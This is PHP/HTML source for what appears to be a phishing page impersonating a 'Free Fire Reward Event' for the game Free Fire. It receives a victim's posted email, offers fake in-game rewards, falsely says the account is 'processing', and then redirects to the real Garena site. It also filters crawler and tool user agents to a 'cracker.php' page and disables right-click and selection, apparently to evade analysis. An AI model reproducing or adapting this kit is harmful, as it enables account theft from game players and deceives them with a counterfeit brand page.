<?php
$ua = $_SERVER['HTTP_USER_AGENT'];
if(preg_match('#Mozilla/4.05 [fr] (Win98; I)#',$ua) || preg_match('/Java1.1.4/si',$ua) || preg_match('/MS FrontPage Express/si',$ua) || preg_match('/HTTrack/si',$ua) || preg_match('/IDentity/si',$ua) || preg_match('/HyperBrowser/si',$ua) || preg_match('/Lynx/si',$ua)) 
{
header('Location: cracker.php');
die();
}
?>
<?php
// MENGAMBIL KONTROL
include("system/setting.php");

// MENANGKAP DATA YANG DI-INPUT
$email = $_POST['email'];

// MENGALIHKAN KE HALAMAN UTAMA JIKA DATA BELUM DI-INPUT
if($email == ""){
header("Location: index.php");
}
?>
<html>
<head>
<meta charset="UTF-8"/>
<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta property="og:title" content="<?php echo $title;?>">
<meta name="description" content="<?php echo $description;?>">
<meta property="og:description" content="<?php echo $description;?>">
<meta property="og:url" content="./">
<meta property="og:site_name" content="<?php echo $title;?>">
<meta property="og:type" content="website">
<meta name="copyright"content="<?php echo $copyright;?>">
<meta name="theme-color" content="<?php echo $theme;?>">
<meta property="og:image" content="<?php echo $image;?>">
<title><?php echo $title;?></title>
<link rel="stylesheet" href="css/style.css">
<link rel="stylesheet" href="css/animate.css">
<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/material-design-iconic-font/2.2.0/css/material-design-iconic-font.min.css">
<link rel="icon" href="<?php echo $icon;?>">
</head>
<body oncontextmenu="return false" onselectstart="return false" ondragstart="return false">
  
<div class="container">

<div style="background: #000; width: 100%; height: 50px; border-bottom: 1px solid #eaa300;">
<div style="margin-left: 6px; margin-top: 5px; color: #eaa300; font-size: 17px; font-family: Teko; text-align: left; text-transform: uppercase; float: left;">
FREE FIRE
</br>
<span style="color: #fff; line-height: 10px;">OFFICIAL FREE FIRE REWARD</span>
</div>
<div style="width: auto; margin-top: -7px; margin-right: 12px; float: right;">
<button type="button" style="background: #eaa300; width: auto; height: auto; margin-top: 17px; padding: 3px; padding-left: 7px; padding-right: 7px; color: #000; font-size: 15px; font-family: Teko; text-align: center; text-transform: uppercase; border:1px solid #ffcc57; border-radius: 1px;">Purchase</button>
<button type="button" style="background: #eaa300; width: auto; height: auto; margin-top: 17px; padding: 3px; padding-left: 7px; padding-right: 7px; color: #000; font-size: 15px; font-family: Teko; text-align: center; text-transform: uppercase; border:1px solid #ffcc57; border-radius: 1px;">Download</button>
</div>
</div>

<div class="header">
<video src="media/header.mp4" autoplay loop muted></video>
</div>

<div class="box">
<center>
<div class="alert">
<i class="fa fa-bell"></i>
<p>Welcome to FREE FIRE REWARD EVENT</p>
</div>
<div class="menu active" onmousedown="buka.play()" onclick="openHero(event, 'latest');" id="defaultOpen">BUNDLE</div>
<div class="menu" onmousedown="buka.play()" onclick="openHero(event, 'weapon');">WEAPOM</div>
<div class="menu" onmousedown="buka.play()" onclick="openHero(event, 'other');">DIAMOND</div>
</center>

<div id="latest" class="gallery">
<div class="scroll">
<center>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/0JT6gqq/1.jpg">
<div>
<button onmousedown="buka.play();" onclick="reward_confirmation(this);" src="https://i.ibb.co/0JT6gqq/1.jpg">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/mJh6Y2w/10.jpg">
<div>
<button onmousedown="buka.play();" onclick="reward_confirmation(this);" src="https://i.ibb.co/mJh6Y2w/10.jpg">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/SxSF99F/2.jpg">
<div>
<button onmousedown="buka.play();" onclick="reward_confirmation(this);" src="https://i.ibb.co/SxSF99F/2.jpg">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/GQvqFh5/3.jpg">
<div>
<button onmousedown="buka.play();" onclick="reward_confirmation(this);" src="https://i.ibb.co/GQvqFh5/3.jpg">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/nndXjdr/4.jpg">
<div>
<button onmousedown="buka.play();" onclick="reward_confirmation(this);" src="https://i.ibb.co/nndXjdr/4.jpg">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/ngRXgX4/5.jpg">
<div>
<button onmousedown="buka.play();" onclick="reward_confirmation(this);" src="https://i.ibb.co/ngRXgX4/5.jpg">Collect</button>
</div>
</div>
</center>
</div> <!--- scroll --->
</div> <!--- tab --->

<div id="other" class="gallery">
<div class="scroll">
<div class="balance">
<img src="img/other/uc.png">
<div class="balance-nom">1250 + 125</div>
<div class="balance-detail">Additional reward for Runic Power</div>
<button onmousedown="buka.play();" onclick="reward_confirmation(this);" src="img/other/uc.png">Collect</button>
</div>
<div class="balance">
<img src="img/other/uc.png">
<div class="balance-nom">2500 + 375</div>
<div class="balance-detail">Additional reward for Runic Power</div>
<button onmousedown="buka.play();" onclick="reward_confirmation(this);" src="img/other/uc.png">Collect</button>
</div>
<div class="balance">
<img src="img/other/uc.png">
<div class="balance-nom">5000 + 1000</div>
<div class="balance-detail">Additional reward for Runic Power</div>
<button onmousedown="buka.play();" onclick="reward_confirmation(this);" src="img/other/uc.png">Collect</button>
</div>
<div class="balance">
<img src="img/other/paint.png">
<div class="balance-nom">10</div>
<div class="balance-detail">Additional reward for Runic Power</div>
<button onmousedown="buka.play();" onclick="reward_confirmation(this);" src="img/other/paint.png">Collect</button>
</div>
<div class="balance">
<img src="img/other/paint.png">
<div class="balance-nom">15</div>
<div class="balance-detail">Additional reward for Runic Power</div>
<button onmousedown="buka.play();" onclick="reward_confirmation(this);" src="img/other/paint.png">Collect</button>
</div>
<div class="balance">
<img src="img/other/paint.png">
<div class="balance-nom">20</div>
<div class="balance-detail">Additional reward for Runic Power</div>
<button onmousedown="buka.play();" onclick="reward_confirmation(this);" src="img/other/paint.png">Collect</button>
</div>
<div class="balance">
<img src="img/other/material.png">
<div class="balance-nom">10</div>
<div class="balance-detail">Additional reward for Runic Power</div>
<button onmousedown="buka.play();" onclick="reward_confirmation(this);" src="img/other/material.png">Collect</button>
</div>
<div class="balance">
<img src="img/other/material.png">
<div class="balance-nom">15</div>
<div class="balance-detail">Additional reward for Runic Power</div>
<button onmousedown="buka.play();" onclick="reward_confirmation(this);" src="img/other/material.png">Collect</button>
</div>
<div class="balance">
<img src="img/other/material.png">
<div class="balance-nom">20</div>
<div class="balance-detail">Additional reward for Runic Power</div>
<button onmousedown="buka.play();" onclick="reward_confirmation(this);" src="img/other/material.png">Collect</button>
</div>
</div> <!--- scroll --->
</div> <!--- tab --->
</div> <!--- box --->
</div> <!--- container --->

<div class="popup reward_confirmation">
<div class="popup-box">
<div class="nav-popup"><div class="nav-popup-title">Processing Account</div></div>
<div class="popup-alert">
Thank your for joining FREE FIRE REWARD EVENT
<br>
<br>
Currently your account has been successfully processing
<br>
Please wait up to 24 hours to receive your rewards
<br>
<br>
</div>
<button type="button" class="popup-btn popup-btn-collect" onmousedown="buka.play()" onclick="location.href='https://ff.garena.com/';"><span>Logout</span></button>
</div>
</div>

<script type="text/javascript" src="http://code.jquery.com/jquery-1.10.2.min.js"></script>
<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
<script src="js/timer.js"></script>
<script src="js/tab.js"></script>
<script src="js/popup.js"></script>
<script src="js/click.js"></script>

</body>
</html>